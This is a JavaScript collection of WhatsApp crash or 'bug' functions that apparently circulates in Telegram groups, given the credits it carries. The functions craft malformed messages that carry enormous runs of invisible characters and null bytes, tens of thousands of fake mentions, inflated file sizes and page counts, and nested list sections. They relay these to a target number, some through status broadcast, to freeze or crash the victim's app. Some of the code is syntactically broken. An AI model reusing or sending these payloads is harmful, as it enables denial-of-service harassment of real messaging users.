async function CursorCrL(isTarget) {
  const msg = await generateWAMessageFromContent(isTarget, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        interactiveMessage: {
          body: { 
            text: '' 
          },
          footer: { 
            text: '' 
          },
          carouselMessage: {
            cards: [
              {               
                header: {
                  title: '𖤐 X-𐍂ΛƿƿΣᥒ :: 𝚵𐌕𐌍𐒀VΣЯЯ',
                  imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    fileSha256: "ydrdawvK8RyLn3L+d+PbuJp+mNGoC2Yd7s/oy3xKU6w=",
                    fileLength: "164089",
                    height: 1,
                    width: 1,
                    mediaKey: "2saFnZ7+Kklfp49JeGvzrQHj1n2bsoZtw2OKYQ8ZQeg=",
                    fileEncSha256: "na4OtkrffdItCM7hpMRRZqM8GsTM6n7xMLl+a0RoLVs=",
                    directPath: "/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1749172037",
                    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAsAAEAAwEBAAAAAAAAAAAAAAAAAQIDBAUBAQEAAAAAAAAAAAAAAAAAAAAB/9oADAMBAAIQAxAAAADxq2mzNeJZZovmEJV0RlAX6F5I76JxgAtN5TX2/G0X2MfHzjq83TOgNteXpMpujBrNc6wquimpWoKwFaEsA//EACQQAAICAgICAQUBAAAAAAAAAAABAhEDIQQSECAUEyIxMlFh/9oACAEBAAE/ALRR1OokNRHIfiMR6LTJNFsv0g9bJvy1695G2KJ8PPpqH5RHgZ8lOqTRk4WXHh+q6q/SqL/iMHFyZ+3VrRhjPDBOStqNF5GvtdQS2ia+VilC2lapM5fExYIWpO78pHQ43InxpOSVpk+bJtNHzM6n27E+Tlk/3ZPLkyUpSbrzDI0qVFuraG5S0fT1tlf6dX6RdEZWt7P2f4JfwUdkqGijXiA9OkPQh+n/xAAXEQADAQAAAAAAAAAAAAAAAAABESAQ/9oACAECAQE/ANVukaO//8QAFhEAAwAAAAAAAAAAAAAAAAAAARBA/9oACAEDAQE/AJg//9k=",
                    scansSidecar: "PllhWl4qTXgHBYizl463ShueYwk=",
                    scanLengths: [8596, 155493]
                  },
                  hasMediaAttachment: true, 
                },
                body: { 
                  text: "𖤐 X-𐍂ΛƿƿΣᥒ :: 𝚵𐌕𐌍𐒀VΣЯЯ"
                },
                footer: {
                  text: "phyx.json"
                },
                nativeFlowMessage: {
                  messageParamsJson: "\n".repeat(10000) 
                }
              }
            ]
          },
          contextInfo: {
            participant: "0@s.whatsapp.net",             
            quotedMessage: {
              viewOnceMessage: {
                message: {
                  interactiveResponseMessage: {
                    body: {
                      text: "Sent",
                      format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                      name: "galaxy_message",
                      paramsJson: "{ finix.json }",
                      version: 3
                    }
                  }
                }
              }
            },
            remoteJid: "@s.whatsapp.net"
          }
        }
      }
    }
  }, {});

  await Ai.relayMessage(isTarget, msg.message, {
    participant: { jid: isTarget },
    messageId: msg.key.id
  });
}



async function DevilsProtocolV2(target, mention) {
  const sock = getActiveSock();
  if (!sock) {
    console.log("❌ Tidak ada koneksi WhatsApp aktif.");
    return; // Mencegah eksekusi lebih lanjut jika tidak ada koneksi aktif
  }

  console.log(chalk.white(Succesfully Sending Devils Proto2 To ${target}));

  const mentionjid = [
    "9999999999@s.whatsapp.net",
    ...Array.from({ length: 40000 }, () =>
      1${Math.floor(Math.random() * 500000)}@s.whatsapp.net
    )
  ];

  const embeddedMusic = {
    musicContentMediaId: "589608164114571",
    songId: "870166291800508",
    author: "Devils Protocols" + "᭄".repeat(10000),
    title: "Version 2" + "᭄",
    artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc",
    artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
    artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
    artistAttribution: "https://n.uguu.se/UnDeath.jpg",
    countryBlocklist: true,
    isExplicit: true,
    artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
  };

  const devilsMessage = {
    url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc",
    mimetype: "video/mp4",
    fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
    fileLength: "999999999999",
    seconds: 999999,
    mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
    caption: "𝕯𝖊𝖛𝖎𝖑𝖘 𝕻𝖗𝖔𝖙𝖔𝖈𝖔𝖑𝖘",
    height: 640,
    width: 640,
    fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
    directPath: "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc",
    mediaKeyTimestamp: "1743848703",
    contextInfo: {
      externalAdReply: {
        showAdAttribution: true,
        title: 🥶,
        body: ${"\u0000".repeat(9117)},
        mediaType: 1,
        renderLargerThumbnail: true,
        thumbnailUrl: null,
        sourceUrl: "https://t.me/FunctionLihX"
      },
      businessMessageForwardInfo: {
        businessOwnerJid: target
      },
      isSampled: true,
      mentionedJid: mentionjid
    },
    forwardedNewsletterMessageInfo: {
      newsletterJid: "120363406229895095@newsletter",
      serverMessageId: 1,
      newsletterName: ${"ꦾ".repeat(100)}
    },
    streamingSidecar: "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
    thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc",
    thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
    thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
    annotations: [
      {
        embeddedContent: {
          embeddedMusic
        },
        embeddedAction: true
      }
    ]
  };

  const msg = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        videoMessage: devilsMessage
      }
    }
  }, {});

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              { tag: "to", attrs: { jid: target }, content: undefined }
            ]
          }
        ]
      }
    ]
  });

  if (mention) {
    await sock.relayMessage(target, {
      groupStatusMentionMessage: {
        message: {
          protocolMessage: {
            key: msg.key,
            type: 25
          }
        }
      }
    }, {
      additionalNodes: [
        {
          tag: "meta",
          attrs: { is_status_mention: "true" },
          content: undefined
        }
      ]
    });
  }
}


Credits: https://t.me/thetailungtech

async function crashIosInvisible(target) {
  const invisibleGlitch = '\u200E'.repeat(10000) + '\u2063'.repeat(10000) + '\u200B'.repeat(5000) + '\u0000'.repeat(5000);

  const msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        conversation: invisibleGlitch
      }
    }
  }, { userJid: target });

  await arga.relayMessage(target, msg.message, {
    messageId: msg.key.id
  });

  console.log(`📱 Sent iOS Invisible Crash to ${target}`);
}


async function ghostCrash(target) {
  await delay(2000);  // Delay ringan sebelum trigger (optional)

  return {
    viewOnceMessage: {
      message: {
        listResponseMessage: {
          title: "\u200E",  // Invisible title
          listType: 2,
          singleSelectReply: {
            selectedRowId: "\u200E",  // Invisible
          },
          contextInfo: {
            stanzaId: crypto.randomBytes(16).toString("hex"),
            participant: "0@s.whatsapp.net",  // ANONYMOUS
            remoteJid: "status@broadcast",   // No chat jejak
            mentionedJid: [target],
            quotedMessage: {
              buttonsMessage: {
                documentMessage: {
                  url: "https://example.com",  // Fake URL
                  mimetype: "application/pdf",
                  fileSha256: crypto.randomBytes(32).toString("base64"),
                  fileLength: "999999999999999",  // Brutal Payload
                  pageCount: 999999999,
                  mediaKey: crypto.randomBytes(32).toString("base64"),
                  fileName: "\u200E",  // Invisible
                  caption: "\u200E",   // Invisible caption
                },
                contentText: "\u200E",
                footerText: "\u200E",
                buttons: [
                  {
                    buttonId: "\u200E".repeat(2000000),  // Heavy Payload
                    buttonText: {
                      displayText: "\u200E",  // Invisible button
                    },
                    type: 1,
                  },
                ],
                headerType: 3,
              },
            },
            forwardingScore: 999999,
            isForwarded: true,
            expiration: -99999,
            ephemeralSettingTimestamp: Date.now(),
            ephemeralSharedSecret: crypto.randomBytes(16),
          },
          description: "\u200E",  // Invisible desc
        },
      },
    },
  };
}


async function VampireFile(target, QBug, Ptcp = true) {
    let virtex = "𝑉⃪𝑎⃪𝑚⃪𝑝⃪𝑖⃪𝑟⃪𝑒 𝐹⃪𝑟⃪𝑒⃪𝑒⃪𝑧⃪𝑒\n " + "ꦽ".repeat(300000);
    await vampire.relayMessage(target, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                            mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                            fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                            fileLength: "999999999",
                            pageCount: 0x9184e729fff,
                            mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                            fileName: "NtahMengapa..",
                            fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                            directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                            mediaKeyTimestamp: "1715880173",
                            contactVcard: true
                        },
                        title: "",
                        hasMediaAttachment: true
                    },
                    body: {
                        text: virtex
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                        groupMentions: [{ groupJid: "0@s.whatsapp.net", groupSubject: "anjay" }]
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
}

Crash UI "listMessage" 🔥
async function CrashUI(from) {
  const UICrash = "ꦾ".repeat(166666);
  await sock.relayMessage(from, {
    "listMessage": {
      "title":`${UICrash}`,
      "description": `${UICrash}`,
      "listType": 2,
      "productListInfo": {
        "productSections": [
          {
            "title": "LIST_CATALOG",
            "products": [
              { "productId": "000000000000000" },
              { "productId": "000000000000000" },
              { "productId": "000000000000000" },
              { "productId": "000000000000000" }
            ]
          }
        ],
        "headerImage": {
          "productId": "0000000000000",
          "jpegThumbnail":`${jpegThumbnail}`
        },
        "businessOwnerJid": "0000000000000@s.whatsapp.net"
      }
    }
  }, { participant: { jid: from }});
}




async function RaidenFucker(rich, target, ptcp = true) {
  const virtex = [
    {
      attrs: { biz_bot: "1" },
      tag: "bot",
    },
    {
      attrs: {},
      tag: "biz",
    },
  ];

  let messagePayload = {
    viewOnceMessage: {
      message: {
        listResponseMessage: {
          title: "σвℓινιση ιѕ ℓιƒє" + "ꦽ".repeat(16999), 
          listType: 2,
          singleSelectReply: {
            selectedRowId: "🐛",
          },
          contextInfo: {
            virtexId: client.generateMessageTag(),
            participant: "13135550002@s.whatsapp.net",
            mentionedJid: [target],
            quotedMessage: {
              buttonsMessage: {
                documentMessage: {
                  url: "https://example.com/largefile",
                  mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                  fileLength: "9999999999999", // Large file size
                  pageCount: 1316134911,  // Max page count to slow down memory
                  mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                  fileName: "𝕆𝕓𝕝𝕚𝕧𝕚𝕠𝕟" + "ꦽ".repeat(97770),
                  fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                  directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1726867151",
                  contactVcard: true,
                  jpegThumbnail: "",
                },
                hasMediaAttachment: true,
                contentText: '𝔻𝕖𝕒𝕥𝕙 𝕚𝕤 𝕃𝕚𝕗𝕖',
                footerText: "𐌁Ꝋ𐌓𐌄𐌃𐌃𐌃𐌃𐌃𐌃𐌃",
                buttons: [
                  {
                    buttonId: "\u0000".repeat(170000),
                    buttonText: {
                      displayText: "ᏕᏝᏋᏋᎮ ᏖᎥᎷᏋ" + "ꦽ".repeat(1999),
                    },
                    type: 1,
                  },
                  {
                    buttonId: "\u0000".repeat(220000),
                    buttonText: {
                      displayText: "ᏕᏝᏋᏋᎮ ᏖᎥᎷᏋ" + "ꦽ".repeat(1999),
                    },
                    type: 1,
                  },
                  {
                    buttonId: "\u0000".repeat(220000),
                    buttonText: {
                      displayText: "ᏕᏝᏋᏋᎮ ᏖᎥᎷᏋ" + "ꦽ".repeat(1999),
                    },
                    type: 1,
                  },
                ],
                viewOnce: true,
                headerType: 3,
              },
            },
            expiration: -99999,
            ephemeralSettingTimestamp: Date.now(),
            ephemeralSharedSecret: crypto.randomBytes(16),
            entryPointConversionSource: "❤️",
            entryPointConversionApp: "💛",
            actionLink: {
              url: "t.me/cryptoLord_n",
              buttonTitle: "Ampas",
            },
            disappearingMode: {
              initiator: 1,
              trigger: 2,
              initiatorDeviceJid: target,
              initiatedByMe: true,
            },
            groupSubject: "🐊",
            parentGroupJid: "🐍",
            trustBannerType: "🐛",
            trustBannerAction: 99999,
            isSampled: true,
            externalAdReply: {},
          },
          description: "ꦽ".repeat(29999),
        },
        messageContextInfo: {
          messageSecret: crypto.randomBytes(32),
          supportPayload: JSON.stringify({
            version: 2,
            is_ai_message: true,
            should_show_system_message: true,
            ticket_id: crypto.randomBytes(16),
          }),
        },
      },
    },
  };
  let sections = [];
  for (let i = 0; i < 40; i++) {  
    let largeText = "\u0000".repeat(11999);  
    let deepNested = {
      title: Section ${i + 1},
      highlight_label: Highlight ${i + 1},
      rows: [
        {
          title: largeText,
          id: "\u0000".repeat(999),
          subrows: [
            {
              title: "\u0000".repeat(999),
              id: "\u0000".repeat(999),
              subsubrows: [
                {
                  title: "\u0000".repeat(999),
                  id: "\u0000".repeat(999),
                },
                {
                  title: "\u0000".repeat(999),
                  id: "\u0000".repeat(999),
                },
              ],
            },
            {
              title: "\u0000".repeat(999),
              id: "\u0000".repeat(999),
            },
          ],
        },
      ],
    };
    sections.push(deepNested);
  }

  let listMessage = {
    title: "ꦽ".repeat(70000),
    sections: sections,
  };

  let msg = generateWAMessageFromContent(
    target,
    proto.Message.fromObject({
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: rich.Message.InteractiveMessage.create({
            contextInfo: {
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              mentionedJid: [target],
              isForwarded: true,
              forwardingScore: 999,
            },
            body: proto.Message.InteractiveMessage.Body.create({
              text: 'αℓℓ нαιℓ σвℓινιση' + "ꦽ".repeat(29999),
            }),
            footer: proto.Message.InteractiveMessage.Footer.create({
              buttonParamsJson: JSON.stringify(listMessage),
            }),
            header: proto.Message.InteractiveMessage.Header.create({
              buttonParamsJson: JSON.stringify(listMessage),
              subtitle: "𝕺𝖇𝖑𝖎𝖛𝖎𝖔𝖓 𝖎𝖘 𝖉𝖊𝖆𝖙𝖍" + "\u0000".repeat(9999),
              hasMediaAttachment: false,
            }),
            nativeFlowMessage:
              proto.Message.InteractiveMessage.NativeFlowMessage.create({
                buttons: [
                  {
                    name: "single_select",
                    buttonParamsJson: "JSON.stringify(listMessage)",
                  },
                  {
                    name: "call_permission_request",
                    buttonParamsJson: "{}",
                  },
                  {
                    name: "single_select",
                    buttonParamsJson: "JSON.stringify(listMessage)",
                  },
                ],
              }),
          }),
        },
      },
    }),
    { userJid: target }
  );
  
  await rich.relayMessage(target, msg.message, {
    messageId: msg.key.id,
    participant: { jid: target },
  });



async function GroupCarous(target) {
let Yuukiy = {
viewOnceMessage: {
message: {
interactiveMessage: {
header: {
title: "", 
liveLocationMessage: {
degreesLatitude: 0,
degreesLongitude: 0,
jpegThumbnail: thumb
}, 
hasMediaAttachment: true
}, 
body: {
text: `\`You Cant Escape From \"YUUKEY\"\``,
},
nativeFlowMessage: {
buttons: [{
name: "single_select",
buttonParamsJson:  `{
"title":"\`¿Que Yuukey?\`",
"sections":[
{"title":"${"\u0000".repeat(900000)}",
"rows":[
{
"title":"Kono Yuukey Daa!!!", 
"description":"Wryyyyyyy", 
"rowId":".Katenawa Orewa Ho Da"
}, {
"title":"Kono Diaboro Daa!!!",
"description":"Epitapu",
"rowId":".Kingu Krimson"
}
]
}
]
}`
},
],
},
},
},
carouselMessage: {
cards: []
}, 
},
};
for (let i = 0; i <70; i++) {
await rich.relayMessage(target, rich, { participant: { jid:target }, });
};
}



async function BlankGc(target) {
  const spamText = "GabutDoang".repeat(9000);
  const title = "👑 Testing bang 👑";
  const caption = ؙ${title}\n${spamText};
  const newsletterJid = "120363400307044967@newsletter";

  const message = {
    newsletterAdminInviteMessage: {
      newsletterJid: newsletterJid,
      newsletterName: title + spamText,
      caption: caption,
      inviteExpiration: "99999999"
    }
  };

  await sock.relayMessage(target, message, { userJid: target });
  await sock.relayMessage(target, message, { userJid: target });
}


async function delayinvisiXo(target) {
    const delaymention = Array.from({ length: 9741 }, (_, r) => ({
        title: "᭯".repeat(9741),
        rows: [{ title: ${r + 1}, id: ${r + 1} }]
    }));

    const MSG = {
        viewOnceMessage: {
            message: {
                listResponseMessage: {
                    title: "FatirXOver Is Here🤪",
                    listType: 2,
                    buttonText: null,
                    sections: delaymention,
                    singleSelectReply: { selectedRowId: "☠️" },
                    contextInfo: {
                        mentionedJid: Array.from({ length: 9741 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: "9741@newsletter",
                            serverMessageId: 1,
                            newsletterName: "-"
                        }
                    },
                    description: "( # )"
                }
            }
        },
        contextInfo: {
            channelMessage: true,
            statusAttributionType: 2
        }
    };

    const msg = generateWAMessageFromContent(target, MSG, {});

    await Fatir.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });
}
async function DelayInVis(target, show) {
            let push = [];
                push.push({
                    body: proto.Message.InteractiveMessage.Body.fromObject({ text: "#hay" }),
                    footer: proto.Message.InteractiveMessage.Footer.fromObject({ text: "#hay" }),
                    header: proto.Message.InteractiveMessage.Header.fromObject({
                        title: "#hay",
                        hasMediaAttachment: true,
                        imageMessage: {
                            url: "https://mmg.whatsapp.net/v/t62.7118-24/13168261_1302646577450564_6694677891444980170_n.enc?ccb=11-4&oh=01_Q5AaIBdx7o1VoLogYv3TWF7PqcURnMfYq3Nx-Ltv9ro2uB9-&oe=67B459C4&_nc_sid=5e03e0&mms3=true",
                            mimetype: "image/jpeg",
                            fileSha256: "88J5mAdmZ39jShlm5NiKxwiGLLSAhOy0gIVuesjhPmA=",
                            fileLength: "18352",
                            height: 720,
                            width: 1280,
                            mediaKey: "Te7iaa4gLCq40DVhoZmrIqsjD+tCd2fWXFVl3FlzN8c=",
                            fileEncSha256: "w5CPjGwXN3i/ulzGuJ84qgHfJtBKsRfr2PtBCT0cKQQ=",
                            directPath: "/v/t62.7118-24/13168261_1302646577450564_6694677891444980170_n.enc?ccb=11-4&oh=01_Q5AaIBdx7o1VoLogYv3TWF7PqcURnMfYq3Nx-Ltv9ro2uB9-&oe=67B459C4&_nc_sid=5e03e0",
                            mediaKeyTimestamp: "1737281900",
                            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIACgASAMBIgACEQEDEQH/xAAsAAEBAQEBAAAAAAAAAAAAAAAAAwEEBgEBAQEAAAAAAAAAAAAAAAAAAAED/9oADAMBAAIQAxAAAADzY1gBowAACkx1RmUEAAAAAA//xAAfEAABAwQDAQAAAAAAAAAAAAARAAECAyAiMBIUITH/2gAIAQEAAT8A3Dw30+BydR68fpVV4u+JF5RTudv/xAAUEQEAAAAAAAAAAAAAAAAAAAAw/9oACAECAQE/AH//xAAWEQADAAAAAAAAAAAAAAA
